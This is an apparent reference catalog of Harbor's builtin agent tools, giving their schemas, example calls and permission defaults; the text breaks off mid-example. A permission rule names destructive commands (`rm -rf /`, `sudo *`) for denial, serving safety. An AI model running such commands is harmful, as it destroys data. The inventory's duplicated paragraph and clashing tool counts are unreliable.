# Harbor Tools Catalog

> Comprehensive reference for every builtin tool Harbor ships with, plus a tutorial for
> writing your own. Cross-references
> [CLAUDE.md](../CLAUDE.md) (conventions),
> [AGENTS.md](../AGENTS.md) (operational guide),
> [PLUGIN_DEVELOPMENT.md](./PLUGIN_DEVELOPMENT.md) (the Roslyn plugin loader), and
> [SCRIPTING.md](./SCRIPTING.md) (JS/TS script-registered tools).
>
> **Связанные документы:**
> - [docs/PATTERNS.md](./PATTERNS.md) — Strategy / Registry / Command patterns realized by the tool layer.
> - [docs/EXAMPLES.md](./EXAMPLES.md) — task-oriented recipes ("How do I...?").
> - [docs/ANTIPATTERNS.md](./ANTIPATTERNS.md) — what NOT to do inside a tool.

## Table of contents

1. [Inventory](#1-inventory)
2. [Per-tool reference](#2-per-tool-reference)
   - [read](#read)
   - [write](#write)
   - [edit](#edit)
   - [bash](#bash)
   - [glob](#glob)
   - [grep](#grep)
   - [ls](#ls)
   - [task](#task)
   - [webfetch](#webfetch)
   - [patch](#patch)
   - [notebook](#notebook)
   - [ripgrep](#ripgrep)
   - [tree](#tree)
   - [mcp](#mcp)
- [skill](#skill)
   - [read_mcp_resource](#read_mcp_resource)
   - [mcp_prompt](#mcp_prompt)
   - [session_read](#session_read)
   - [session_steer](#session_steer)
   - [harbor_inspect](#harbor_inspect)
- [plugin_manager](#plugin_manager)
   - [goal](#goal)
3. ["When to use X vs Y" matrix](#3-when-to-use-x-vs-y-matrix)
4. [Tool chains — common composition patterns](#4-tool-chains--common-composition-patterns)
5. [Building your own tool — WebFetchTool walkthrough](#5-building-your-own-tool--webfetchtool-walkthrough)
6. [JSON Schema tips & common mistakes](#6-json-schema-tips--common-mistakes)
7. [Permission model — gotchas & rationale](#7-permission-model--gotchas--rationale)
8. [Sub-agent delegation — `task` deep dive](#8-sub-agent-delegation--task-deep-dive)
9. [MCP integration — adding an MCP server](#9-mcp-integration--adding-an-mcp-server)
10. [Testing tools](#10-testing-tools)

---

## 1. Inventory

Harbor ships **22 builtin tools** registered by `Harbor.Hosting.ToolsCatalog.CreateToolRegistry`
(in `src/Harbor.Hosting/Modules/ToolsCatalog.cs`). They live in
`src/Harbor.Tools.Builtin/Tools/<Name>/<Name>Tool.cs` and are plain `sealed` classes
implementing `Harbor.Abstractions.Tools.ITool`.

> **Tool sets**: hosts pick a `HarborToolSetKind` in `HarborComposeOptions`. `Full14`
> (the CLI default — the enum name predates the tool count) registers all 22 tools
> (14 classic + `lsp` + `skill` + `read_mcp_resource` + `mcp_prompt` + `session_read` +
> `session_steer` + `harbor_inspect` + `plugin_manager`); `Standard10` (name
> likewise predates the count — 13 members today) omits the eight heavier ones
> (`task`, `webfetch`, `ripgrep`, `mcp`, `read_mcp_resource`, `mcp_prompt`,
> `session_read`, `session_steer`).
> The Avalonia desktop app uses `Standard10` (see `apps/Harbor.App.Avalonia/AppHost.cs`).
> `session_read` / `session_steer` also require a wired `ISessionStore`; without one the
> catalog registers 19. `plugin_manager` requires the plugin runtime to be compiled in
> (`HarborWithPlugins=true`, the default).
> `session_steer` + `harbor_inspect` + `goal`); `Standard10` (name likewise predates the
> count — 14 members today) omits the eight heavier ones (`task`, `webfetch`,
> `ripgrep`, `mcp`, `read_mcp_resource`, `mcp_prompt`, `session_read`, `session_steer`).
> The Avalonia desktop app uses `Standard10` (see `apps/Harbor.App.Avalonia/AppHost.cs`).
> `session_read` / `session_steer` also require a wired `ISessionStore`; without one the
> catalog registers 20. `goal` registers either way — it is the one tool whose store
> dependency is optional, and it says so when it is called.

| # | Tool | Mode | Permission | Purpose |
|---|------|------|------------|---------|
| 1 | `read` | Parallel | Allow | Stream text from a file with line numbers / image metadata |
| 2 | `write` | Sequential | Allow `src/*`, Ask elsewhere | Create or overwrite a file |
| 3 | `edit` | Sequential | Allow `src/*`, Deny `*.env*`, Ask elsewhere | Find/replace inside an existing file |
| 4 | `bash` | Sequential | Allow read-only cmds, Ask, Deny `rm -rf /`, `sudo *` | Run a shell command |
| 5 | `glob` | Parallel | Allow | Find files by name pattern |
| 6 | `grep` | Parallel | Allow | Find files by content regex |
| 7 | `ls` | Parallel | Allow | One-level directory listing with sizes + mtimes |
| 8 | `task` | Sequential | Allow | Delegate a sub-task to a sub-agent (`explore`, `plan`, …) |
| 9 | `webfetch` | Parallel | Ask | Fetch URL → markdown (HTML stripped, code kept) |
| 10 | `patch` | Sequential | Allow `src/*`, Ask elsewhere | Apply a unified-diff patch atomically |
| 11 | `notebook` | Sequential | Allow | Persistent per-session markdown notes (JSON file) |
| 12 | `ripgrep` | Parallel | Allow | Fast content search via `rg` binary (gitignore-aware) |
| 13 | `tree` | Parallel | Allow | ASCII directory tree (gitignore-aware) |
| 14 | `mcp` | Sequential | Ask | Bridge to a registered MCP server |
| 15 | `skill` | Parallel | Allow | Load a SKILL.md skill body by name |
| 16 | `read_mcp_resource` | Parallel | Ask | Read an MCP server resource by URI |
| 17 | `mcp_prompt` | Parallel | Ask | Render an MCP server prompt by name |
| 18 | `lsp` | Sequential | Allow | Language-server diagnostics / references / definition |
| 19 | `session_read` | Parallel | Allow | Inspect a peer session's status, outcome and recent transcript |
| 20 | `session_steer` | Sequential | Ask | Send a message / redirect / restart directive to a peer session |
| 21 | `harbor_inspect` | Parallel | Allow | Read-only catalog of what this runtime offers (tools, agents, providers, skills, plugin axes, versions, limits) |
| 22 | `plugin_manager` | Sequential | Allow (the tool asks about every change) | List installed plugins; propose installing / removing / enabling / disabling one |
| 22 | `goal` | Sequential | Allow | Report the goal as complete, or as blocked with a reason |

> **Why these and not more?** Every builtin earns its slot by being either (a) essential for
> any coding task (read/write/edit/bash/glob/grep/ls), (b) a host-aware primitive that needs
> special wiring (`task` needs `IAgentRegistry`, `mcp` needs `IMcpRegistry`), or (c) faster /
> safer than the bash escape hatch (`webfetch` parses HTML server-side, `patch` validates
> context before mutating, `ripgrep` is 10–100× faster than `grep` on large repos).

---

## 2. Per-tool reference

Each entry below uses the same template:

- **Description** — one paragraph
- **Args schema** — JSON Schema (the same `ParameterSchema` the model sees)
- **Examples** — 3+ real call payloads
- **Permissions** — what `PermissionRuleset.Default` says
- **Mode** — `Parallel` or `Sequential`
- **Tips** — operational gotchas

---

### `read`

**Description.** Reads a text file as numbered lines, optionally a `[offset, offset+limit)`
window, with `ArrayPool<byte>`-backed streaming so multi-MB files aren't loaded whole just to
slice. For images (`png/jpg/gif/webp`) it returns metadata + base64 in `ToolResult.Metadata`
for vision-capable hosts. Obvious binary content (NUL bytes) is rejected up front.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "path":   { "type": "string",  "description": "Absolute or relative file path" },
    "offset": { "type": "integer", "description": "1-based start line (optional)" },
    "limit":  { "type": "integer", "description": "Max lines to return (optional)" }
  },
  "required": ["path"]
}
```

**Examples.**

```jsonc
// 1. Read whole file (cap: 2000 lines)
{"path": "src/Harbor.Application/Agents/AgentLoop.cs"}

// 2. Windowed read for a long file
{"path": "src/Harbor.Application/Agents/AgentLoop.cs", "offset": 600, "limit": 80}

// 3. Image metadata (base64 is attached in metadata.imageBase64)
{"path": "screenshots/diff.png"}
```

**Permissions.** Always Allow (`read` `*` Allow). The agent never has to ask.

**Mode.** `Parallel` — safe to fan out with `glob`/`grep` results in the same turn.

**Tips.**
- Always pass `offset` + `limit` for files you expect to be >2000 lines.
- The output uses `[0001]` style 4-digit line numbers — easy to grep visually.
- `read` is preferred over `bash cat` because line numbers survive the model's
  edit-and-write-back cycle: when you later `edit` and the model reports an error like
  "context line did not match at file line 47", you already know the line.
- The last line of the output is the file's **version token**
  (`[file-version: sha256:0123456789abcdef]`): the first 16 hex characters of the
  SHA-256 digest of the file's bytes. Hand it back to `write`/`edit` as
  `expectedVersion` and a file that changed under you is rejected instead of
  overwritten (see [#1757](#file-freshness-cas)).

---

### `write`

**Description.** Creates or overwrites a file. Creates parent directories on demand. The
content is written as UTF-8 without a BOM.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "path":       { "type": "string",  "description": "File path" },
    "content":    { "type": "string",  "description": "Full new content" },
    "createDirs": { "type": "boolean", "description": "Create parent dirs (default: true)" },
    "expectedVersion": { "type": "string", "description": "Version of the file as you last read it (the [file-version: sha256:…] token). The write is rejected when the file changed on disk since" }
  },
  "required": ["path", "content"]
}
```

**Examples.**

```jsonc
// 1. Create a new file with content
{"path": "src/Harbor.Tools.Builtin/Tools/Read/ReadTool.cs", "content": "..."}

// 2. Overwrite an existing file (use read first to see the old content!)
{"path": "README.md", "content": "# Harbor\n..."}

// 3. Write to a deep path — parent dirs auto-created
{"path": "reports/2024/01/audit.md", "content": "..."}

// 4. Guarded overwrite — rejected if the file changed since the read
{"path": "README.md", "content": "# Harbor\n...", "expectedVersion": "sha256:0123456789abcdef"}
```

**Permissions.** Allow under `src/*`, Ask elsewhere. Never silently overwrite files outside
the project source tree without confirmation.

**Mode.** `Sequential` — writes have side effects.

**Tips.**
- Always `read` the file first before overwriting it — the diff between old and new content
  is what you'll want for the user's permission prompt.
- For partial edits use `edit` (single replacement) or `patch` (multi-hunk diff) — both
  preserve unchanged lines and produce a preview.
- The result reports the version of what was written
  (`[file-version: sha256:…]`), so a follow-up write can reuse it without re-reading.

---

### `edit`

**Description.** Find/replace inside an existing file. By default refuses multiple matches
(replaceAll=false) to avoid surprising edits.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "path":        { "type": "string",  "description": "File path" },
    "oldString":   { "type": "string",  "description": "Exact text to find" },
    "newString":   { "type": "string",  "description": "Replacement text" },
    "replaceAll":  { "type": "boolean", "description": "Replace all occurrences (default false)" },
    "expectedVersion": { "type": "string", "description": "Version of the file as you last read it (the [file-version: sha256:…] token). The edit is rejected when the file changed on disk since" },
    "edits":       { "type": "array",   "description": "Multiple edits applied in order" }
  },
  "required": ["path"]
}
```

**Examples.**

```jsonc
// 1. Single rename
{"path": "src/Program.cs", "oldString": "var x = 1;", "newString": "var x = 2;"}

// 2. Multi-line block replacement — include enough context to be unique
{"path": "src/Agent.cs", "oldString": "if (x)\n    return;\n", "newString": "if (x || y)\n    return;\n"}

// 3. Bulk replace
{"path": "docs/old.md", "oldString": "Harbor v0.3", "newString": "Harbor v0.4", "replaceAll": true}

// 4. Guarded edit — rejected if the file changed since the read
{"path": "src/Agent.cs", "oldString": "var x = 1;", "newString": "var x = 2;",
 "expectedVersion": "sha256:0123456789abcdef"}
```

**Permissions.** Allow `src/*`, Deny `*.env` and `*.env.*`, Ask elsewhere.

**Mode.** `Sequential`.

**Tips.**
- For multi-line edits, include 1–2 lines of unique context before AND after the change —
  this is the single most reliable way to avoid the "multiple occurrences" error.
- `oldString` must match exactly including leading whitespace.
- For >3 hunks or multi-file changes prefer `patch` (see below).

---

### File freshness (CAS)

`read`, `write` and `edit` speak a **version token**: `sha256:` plus the first 16 hex
characters of the SHA-256 digest of the file's raw bytes.

- `read` reports the token of the file it read — the last line of the output is
  `[file-version: sha256:0123456789abcdef]` (also in `ToolResult.Metadata.fileVersion`).
- `write` / `edit` accept the token back as `expectedVersion`. If the file's bytes changed
  since the model observed them, the call is **rejected**: the tool result names the
  version the model held, the version on disk now, and tells the model to re-read and
  re-apply. The file is left exactly as the other writer left it.
- `write` / `edit` also report the token of what they just wrote, so a model can chain
  writes (write → write → edit) without re-reading in between.

**Why a content hash and not mtime+size.** A timestamp is not a fact about the content:
`touch`, a `tar -x` that preserves mtimes, and filesystems with coarse timestamp
granularity all report "unchanged" for a file that changed — and a hash of the bytes has
neither failure mode. The price is one sequential read of the file, which `read`/`edit`
already pay for the file they are touching, and which `write` pays only when a version is
actually asserted.

**What is not enforced yet.** The token is optional: a call without `expectedVersion`
behaves exactly as it did before. The mandatory "read the file before you write it" gate
needs a per-session record of what was observed — a seam that does not exist in Harbor
today (see #1757 for where it would go).

---

### `bash`

**Description.** Run a shell command. Captures stdout + stderr, respects a per-command
timeout, returns non-zero exit codes as `ToolResult.Error`.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "command": { "type": "string",  "description": "Shell command (passed to /bin/sh -c)" },
    "cwd":     { "type": "string",  "description": "Working directory (default: current)" },
    "timeout": { "type": "integer", "description": "Timeout in seconds (default: 30, max: 600)" },
    "env":     { "type": "object",  "description": "Additional environment variables" }
  },
  "required": ["command"]
}
```

**Examples.**

```jsonc
// 1. Run the build
{"command": "dotnet build"}

// 2. Run tests, longer timeout (seconds, not ms)
{"command": "dotnet run --project tests/Harbor.Tools.Builtin.Tests -c Release --no-build -- --minimum-expected-tests 1 --treenode-filter \"/*/*/*/*[Category=Integration]\"", "timeout": 300}

// 3. Pipe to grep
{"command": "rg TODO | wc -l"}
```

**Permissions.** Allow read-only commands (`ls`, `cat`, `grep`, `rg`, `find`, `git status`,
`git diff`, `git log`), Ask for everything else, Deny `rm -rf /` and `sudo *`.

**Mode.** `Sequential`.

**Tips.**
- `bash` is the escape hatch — use it when no builtin tool fits.
- For file reads, prefer `read` (gets line numbers + binary rejection).
- For content search, prefer `ripgrep` (faster, respects gitignore).
- For directory listing, prefer `ls` (structured output) or `tree` (overview).
- Set `timeout` (seconds, default 30, max 600) generously for a full-suite test run / `npm install` style commands.

---

### `glob`

**Description.** Find files by name pattern. Returns relative paths sorted by mtime (newest
first). Respects `.gitignore` via `git ls-files` when git is available.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "pattern": { "type": "string", "description": "Glob (e.g. '**/*.cs', '*.md')" },
    "path":    { "type": "string", "description": "Base directory (default: cwd)" }
  },
  "required": ["pattern"]
}
```

**Examples.**

```jsonc
// 1. Find all C# files anywhere under the project
{"pattern": "**/*.cs"}

// 2. Find docs in a specific subdirectory
{"pattern": "*.md", "path": "docs/"}

// 3. Find test files
{"pattern": "**/*Tests.cs", "path": "tests/"}
```

**Permissions.** Always Allow.

**Mode.** `Parallel`.

**Tips.**
- Use `glob` first to discover files, then fan out `read` calls in the same turn — the
  agent loop dispatches `Parallel` tools concurrently.
- Pattern is a .NET glob, not a regex: `*` matches any chars except `/`, `**` matches any
  path segments.

---

### `grep`

**Description.** Recursive content search using a regex. Returns file path + line number +
matched content per match.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "pattern":    { "type": "string",  "description": "Regex pattern" },
    "path":       { "type": "string",  "description": "Base dir or file (default: cwd)" },
    "include":    { "type": "string",  "description": "File name glob (e.g. '*.cs')" },
    "ignoreCase": { "type": "boolean", "description": "Case-insensitive (default false)" },
    "maxResults": { "type": "integer", "description": "Max matches (default: 100)" }
  },
  "required": ["pattern"]
}
```

**Examples.**

```jsonc
// 1. Find all TODOs in C# code
{"pattern": "TODO\\(", "include": "*.cs"}

// 2. Case-insensitive search for a class name
{"pattern": "class\\s+Agent", "ignoreCase": true}

// 3. Find usage of an identifier in a single file
{"pattern": "AgentLoop", "path": "src/Harbor.Application/Agents/AgentLoop.cs"}
```

**Permissions.** Always Allow.

**Mode.** `Parallel`.

**Tips.**
- `grep` is implemented in-process — works everywhere, no external binary required.
- For large repos (>10k files) prefer `ripgrep` (10–100× faster).
- Pass an `include` filter — searching 5 files is 1000× faster than searching 5000.

---

### `ls`

**Description.** One-level directory listing with file sizes and mtimes. Useful before a
deeper `tree` or `glob` to see what's actually in a directory.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "path": { "type": "string", "description": "Directory (default: cwd)" }
  }
}
```

**Examples.**

```jsonc
// 1. List current directory
{}

// 2. List a specific subdirectory
{"path": "src/Harbor.Tools.Builtin/"}

// 3. Confirm a directory exists and see its top-level layout
{"path": "/home/z/my-project/extracted/docs"}
```

**Permissions.** Always Allow.

**Mode.** `Parallel`.

**Tips.**
- `ls` is flat — for a recursive overview use `tree`.
- Sizes are formatted human-readable (e.g. `1.2 KiB`, `3.4 MiB`).
- For "is this file a directory?" checks, `ls` is faster than `tree`.

---

### `task`

**Description.** Delegate a self-contained sub-task to a sub-agent. Sub-agents have their
own context window (no parent visibility), their own permission ruleset, and report back a
single final message. Used to parallelize exploration, isolate file ops, or invoke a
specialized agent (`explore`, `plan`).

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "agent":  { "type": "string", "description": "Sub-agent name (e.g. 'explore', 'plan')" },
    "prompt": { "type": "string", "description": "Self-contained task description" }
  },
  "required": ["agent", "prompt"]
}
```

**Examples.**

```jsonc
// 1. Use the explore agent to map a codebase
{"agent": "explore", "prompt": "Find all ITool implementations and summarize what each does in one line."}

// 2. Use plan agent to design before code
{"agent": "plan", "prompt": "Design the public API for a new `time` builtin tool. Output the JSON schema + 3 example calls."}

// 3. Fan out — call task 3× in one turn for parallel exploration
{"agent": "explore", "prompt": "List every place that calls .Result on a Task."}
```

**Permissions.** Always Allow — sub-agents inherit their own ruleset (typically read-only
for `explore`/`plan`).

**Mode.** `Sequential` (so it doesn't race side-effect tools in the same turn).

**Tips.**
- See [§8 Sub-agent delegation](#8-sub-agent-delegation--task-deep-dive) for the deep dive.

---

### `webfetch`

**Description.** Fetches a URL and returns its body as markdown. HTML is stripped to text +
links + code; JSON / plain text is returned verbatim. Binary content-types are rejected.
Uses a process-wide shared `HttpClient` (HTTP/2, auto-decompress, redirect-following).

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "url":      { "type": "string",  "description": "Absolute URL (http or https)" },
    "selector": { "type": "string",  "description": "Optional CSS-like selector to extract a subtree" },
    "maxChars": { "type": "integer", "description": "Max chars to return (default 50000, max 500000)" }
  },
  "required": ["url"]
}
```

**Examples.**

```jsonc
// 1. Fetch a doc page
{"url": "https://learn.microsoft.com/dotnet/api/system.text.json.jsondocument"}

// 2. Extract just the main article (skip nav/footer)
{"url": "https://example.com/blog/post", "selector": "article", "maxChars": 30000}

// 3. Fetch a JSON API endpoint — returned verbatim
{"url": "https://api.github.com/repos/dotnet/runtime/releases/latest"}
```

**Permissions.** Ask (default). Fetching arbitrary URLs can leak IPs and referer; surfacing
the request to the user is the safe default.

**Mode.** `Parallel`.

**Tips.**
- `selector` is a tiny subset of CSS: `tag`, `#id`, `.class`, or `tag#id` / `tag.class`.
  First match wins. Use this to skip site chrome (nav, footer, sidebar).
- The response includes metadata: `{url, status, contentType, sizeBytes, truncated, chars}`.
  Use `truncated=true` to know you need to call again with a higher `maxChars`.
- 5 MiB hard download cap — for bigger payloads stream via `bash curl` instead.
- HTML→markdown conversion is regex-based (no AngleSharp dep). It's lossy but agent-friendly:
  preserves code fences, inlines links as `[text](url)`, converts `h1`–`h6` to `#`–`######`.

---

### `patch`

**Description.** Applies a unified-diff patch to a single file. Validates that context lines
match before applying; writes to a temp file and renames atomically (POSIX same-filesystem
rename is atomic; .NET 5+ extends this to Windows same-drive). Returns a compact preview of
the changes.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "path":  { "type": "string", "description": "File to patch" },
    "patch": { "type": "string", "description": "Unified diff (one or more @@ ... @@ hunks)" }
  },
  "required": ["path", "patch"]
}
```

**Examples.**

```jsonc
// 1. Single-hunk modification
{
  "path": "src/Program.cs",
  "patch": "@@ -10,3 +10,3 @@\n var x = 1;\n-var y = 2;\n+var y = 3;\n var z = 3;\n"
}

// 2. Add a method (multi-line addition)
{
  "path": "src/Agent.cs",
  "patch": "@@ -50,3 +50,8 @@\n     public void Run() {}\n+    \n+    public void Stop()\n+    {\n+        _cts.Cancel();\n+    }\n     public void Dispose() {}\n"
}

// 3. Multi-hunk patch (e.g. produced by `git diff`)
{
  "path": "src/Harbor.Application/Agents/AgentLoop.cs",
  "patch": "--- a/src/Harbor.Application/Agents/AgentLoop.cs\n+++ b/src/Harbor.Application/Agents/AgentLoop.cs\n@@ -100,3 +100,3 @@\n-        var x = 1;\n+        var x = 2;\n@@ -200,3 +200,3 @@\n-        var y = 3;\n+        var y = 4;\n"
}
```

**Permissions.** Allow `src/*`, Ask elsewhere — same as `edit`.

**Mode.** `Sequential`.

**Tips.**
- Context-mismatch rejection is the killer feature: the file is left untouched if any
  context line doesn't match (with a small ±3 lines slack for line-number drift).
- For 1–2 small edits use `edit`; for 3+ hunks or multi-block rewrites use `patch`.
- The patch format follows `git diff` conventions: lines starting with ` ` (space) are
  context, `-` is deletion, `+` is addition. `@@ -oldStart,oldCount +newStart,newCount @@`
  is the hunk header.
- The tool searches ±3 lines for the hunk's anchor — so minor reformatting nearby won't
  break your patch. But semantic drift (renamed identifiers in the context) WILL break it.

---

### `notebook`

**Description.** Persistent per-session markdown notes keyed by string. Stored as JSON at
`~/.harbor/notes/<sessionId>.json`. Five actions: `get`/`set`/`add`/`clear`/`list`. Use this
for long-running tasks where context across many turns matters: file lists, decisions,
intermediate findings.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "action":  { "type": "string", "description": "One of: get | set | add | clear | list" },
    "key":     { "type": "string", "description": "Note key (required for get/set/add/clear)" },
    "content": { "type": "string", "description": "Note content (required for set; appended for add)" }
  },
  "required": ["action"]
}
```

**Examples.**

```jsonc
// 1. Set a single note (overwrites if exists)
{"action": "set", "key": "task-goal", "content": "Refactor AgentLoop into 4 collaborators."}

// 2. Append to an existing note
{"action": "add", "key": "decisions", "content": "- Use Strategy pattern for tool dispatch\n- Use Observer for events"}

// 3. List all notes
{"action": "list"}

// 4. Get a specific note
{"action": "get", "key": "task-goal"}

// 5. Clear one note (or all — omit key)
{"action": "clear", "key": "task-goal"}
{"action": "clear"}
```

**Permissions.** Always Allow — notes are scoped to the session, never escape the local
filesystem, and live under `~/.harbor/notes/`.

**Mode.** `Sequential` (file I/O).

**Tips.**
- Notes are scoped per session — they don't leak across sessions. Session id is sanitized
  to `[A-Za-z0-9_-]`.
- 16 KiB max per note; 256 notes per session. For bigger data, write a file with `write`
  and stash the path in a notebook note.
- The `list` action returns each note's first line as a preview — good for orienting at
  the start of a turn.

---

### `ripgrep`

**Description.** Wraps the `rg` (ripgrep) binary for fast content search. Returns
`file:line:content` per match. Respects `.gitignore` automatically. Falls back to a helpful
error message hinting at `grep` if `rg` is not installed.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "pattern":    { "type": "string",  "description": "Search pattern (regex by default)" },
    "path":       { "type": "string",  "description": "Base directory or file (default: cwd)" },
    "glob":       { "type": "string",  "description": "File name glob (e.g. '*.cs' or '*.{cs,ts}')" },
    "ignoreCase": { "type": "boolean", "description": "Case-insensitive (default: false)" },
    "regex":      { "type": "boolean", "description": "Treat pattern as regex (default true). false = fixed-string" },
    "maxResults": { "type": "integer", "description": "Max matches (default 100, max 10000)" }
  },
  "required": ["pattern"]
}
```

**Examples.**

```jsonc
// 1. Find all ITool implementations (regex)
{"pattern": "class\\s+\\w+Tool\\s*:\\s*ITool", "glob": "*.cs"}

// 2. Fixed-string search (no regex escaping)
{"pattern": "TODO(principles)", "regex": false}

// 3. Case-insensitive search across TS+JS only
{"pattern": "AgentLoop", "glob": "*.{ts,js}", "ignoreCase": true, "maxResults": 50}
```

**Permissions.** Always Allow.

**Mode.** `Parallel`.

**Tips.**
- For large repos (>10k files) `ripgrep` is 10–100× faster than the in-process `grep`.
- Respects `.gitignore` out of the box — no `node_modules` / `bin` / `obj` noise.
- Set `regex: false` when searching for literal strings containing regex metachars
  (`(lambda)`, `$x.y`, etc.).
- For per-file truncation the tool passes `--max-columns=400 --max-columns-preview` so
  long minified lines don't blow up the response.

---

### `tree`

**Description.** Renders an ASCII directory tree. Respects `.gitignore` when git is
available (via `git ls-files`); otherwise prunes a built-in list of common build/VCS
directories (`node_modules`, `bin`, `obj`, `.git`, …). Caps depth and entry count to keep
output bounded.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "path":          { "type": "string",  "description": "Directory to tree (default: cwd)" },
    "maxDepth":      { "type": "integer", "description": "Max depth (default 3, max 10)" },
    "includeHidden": { "type": "boolean", "description": "Include hidden files (default false)" },
    "gitignore":     { "type": "boolean", "description": "Respect .gitignore via git ls-files (default true)" },
    "maxEntries":    { "type": "integer", "description": "Max entries (default 1000, max 10000)" }
  }
}
```

**Examples.**

```jsonc
// 1. Default 3-level overview of the current project
{}

// 2. Deep tree of a specific subtree
{"path": "src/Harbor.Tools.Builtin/", "maxDepth": 5}

// 3. Show everything (including hidden + ignored)
{"path": ".", "includeHidden": true, "gitignore": false, "maxDepth": 4}
```

**Example output:**

```
Harbor.Tools.Builtin/
├── Bash/
│   └── BashTool.cs
├── Edit/
│   └── EditTool.cs
├── Glob/
│   └── GlobTool.cs
├── Grep/
│   └── GrepTool.cs
├── Ls/
│   └── LsTool.cs
├── Mcp/
│   └── McpToolTool.cs
├── Notebook/
│   └── NotebookTool.cs
├── Patch/
│   └── PatchTool.cs
├── Read/
│   └── ReadTool.cs
├── RipGrep/
│   └── RipGrepTool.cs
├── Tree/
│   └── TreeTool.cs
├── WebFetch/
│   └── WebFetchTool.cs
├── Write/
│   └── WriteTool.cs
└── GlobalUsings.cs

15 directories, 15 files
```

**Permissions.** Always Allow.

**Mode.** `Parallel`.

**Tips.**
- Default `maxDepth=3` is enough to understand most project layouts — raise to 5+ for
  deeply-nested source trees.
- `gitignore=true` (default) requires git to be available; if git is missing, the tool
  falls back to its built-in prune list (which covers `node_modules`, `bin`, `obj`,
  `.git`, `.vs`, `.idea`, etc.).
- For a flat listing with sizes, use `ls`. For full-path file discovery, use `glob`.

---

### `mcp`

**Description.** Bridge to Model Context Protocol (MCP) servers. Servers are registered
externally via `IMcpRegistry.Register(name, stdioCmd)`; the tool looks up the server and
forwards a JSON-RPC method call. The default `InMemoryMcpRegistry` is a stub that returns
`Result.Failure` for every call — production hosts replace it with a real transport.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "server":  { "type": "string", "description": "Registered MCP server name" },
    "method":  { "type": "string", "description": "JSON-RPC method (e.g. 'tools/list', 'tools/call')" },
    "args":    { "type": "object", "description": "Arguments object" }
  },
  "required": ["server", "method"]
}
```

**Examples.**

```jsonc
// 1. List tools exposed by a registered server
{"server": "filesystem", "method": "tools/list"}

// 2. Call a specific tool
{
  "server": "filesystem",
  "method": "tools/call",
  "args": {"name": "read_file", "arguments": {"path": "/tmp/notes.txt"}}
}

// 3. List resources
{"server": "db", "method": "resources/list"}
```

**Permissions.** Ask (default). MCP servers can do anything the server's transport allows —
treat each one as a tiny RPC sandbox.

**Mode.** `Sequential`.

**Tips.**
- See [§9 MCP integration](#9-mcp-integration--adding-an-mcp-server) for how to register a
  server in your host.
- The `args` field is forwarded verbatim — match the server's JSON-RPC schema.
- A useful first call after registering a server is `tools/list` to discover its API.

---

### `skill`

**Description.** Loads a `SKILL.md` skill body by name. Skills are discovered from the
project-local `.harbor/skills/` directory (wins on collisions) and the global
`~/.harbor/skills/` directory — the same roots the system prompt's
`<available_skills>` block is built from (`WorkspaceContextSource`). Each skill is a
`<name>/SKILL.md` directory or a legacy flat `<name>.md` file, with optional YAML
front-matter (`name:`, `description:`). The tool accepts a NAME only, never a path,
so a crafted name cannot escape the skills roots. Bodies over 12 000 chars are
truncated with a pointer to the file.

**Invocation policy.** A skill declares who may call it, in its own front-matter:
`model-invocable: false` keeps it from the model (it is not listed in
`<available_skills>` and the `skill` tool refuses it with the reason), and
`user-invocable: false` keeps it from the human. A skill that declares neither is
callable by both. The decision is made once, in the skill registry
(`Harbor.SessionContext/Skills/SkillRegistry.cs`), and the model-facing catalog and
this tool read that same registry — so the two cannot disagree about which skills
exist.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "name":  { "type": "string", "description": "Skill name as listed in <available_skills> (e.g. 'code-review')" },
    "scope": { "type": "string", "description": "Where to look: 'project', 'global', or 'any' (default)" }
  },
  "required": ["name"]
}
```

**Examples.**

```jsonc
// 1. Load a skill before doing the task it describes
{"name": "code-review"}

// 2. Prefer the project-local variant explicitly
{"name": "deploy", "scope": "project"}

// 3. Fall back to a globally installed skill
{"name": "commit", "scope": "global"}
```

**Permissions.** Allow (default). Read-only by construction — the tool only reads
files under the two skills roots.

**Mode.** `Parallel`.

**Tips.**
- Manage skills from the shell: `harbor skill list` / `harbor skill install <SKILL.md|dir> [--project]` / `harbor skill uninstall <name>`.
- Project skills shadow same-named global skills — same precedence as the prompt block.
- Don't paste the loaded body back into chat; follow its steps instead.

---

### `read_mcp_resource`

**Description.** Reads an MCP resource (`resources/read`) from a registered server and
returns its text contents. URIs come from `resources/list` (via the generic `mcp`
tool). Binary (base64 blob) entries are rejected with a hint to request a text view.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "server": { "type": "string", "description": "Registered MCP server name" },
    "uri":    { "type": "string", "description": "Resource URI from resources/list (e.g. 'file:///docs/api.md')" }
  },
  "required": ["server", "uri"]
}
```

**Examples.**

```jsonc
// 1. Read a doc exposed by a filesystem server
{"server": "docs", "uri": "file:///docs/api.md"}

// 2. Read a schema exposed by a database server
{"server": "db", "uri": "schema://public/users"}
```

**Permissions.** Ask (default). Same sandbox reasoning as `mcp` — server data is
third-party content.

**Mode.** `Parallel` (read-only).

**Tips.**
- Discover URIs first: `mcp {"server": "db", "method": "resources/list"}`.
- For binary resources, ask the server for a text view instead.

---

### `mcp_prompt`

**Description.** Renders an MCP prompt (`prompts/get`) from a registered server into
plain text the agent can follow. Prompt names come from `prompts/list` (via the
generic `mcp` tool); template variables go through `arguments`. Non-text message
parts (images, embedded resources) are skipped with a note.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "server":    { "type": "string", "description": "Registered MCP server name" },
    "name":      { "type": "string", "description": "Prompt name from prompts/list" },
    "arguments": { "type": "object", "description": "Template variables (optional)" }
  },
  "required": ["server", "name"]
}
```

**Examples.**

```jsonc
// 1. Render a review checklist prompt
{"server": "dev", "name": "code-review"}

// 2. Render with template variables
